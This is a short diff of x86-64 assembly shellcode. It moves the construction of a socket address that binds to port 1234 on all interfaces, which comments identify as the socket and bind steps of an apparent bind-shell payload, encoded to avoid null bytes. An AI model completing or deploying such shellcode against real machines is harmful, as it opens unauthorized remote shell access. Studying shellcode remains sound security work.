@@ -34,6 +34,9 @@
 
     bits    64
     
+    mov     ebx, ~0xD2040002 & 0xFFFFFFFF ; 
+    not     ebx
+    
     ; step 1, create a socket
     ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
     push    97
@@ -49,8 +52,6 @@
     
     ; step 2, bind to port 1234 
     ; bind(s, {AF_INET,1234,INADDR_ANY}, 16)
-    mov     ebx, ~0xD2040002 & 0xFFFFFFFF ; 
-    not     ebx
     push    rbx
     push    rsp
     pop     rsi              ; rsi = &sa
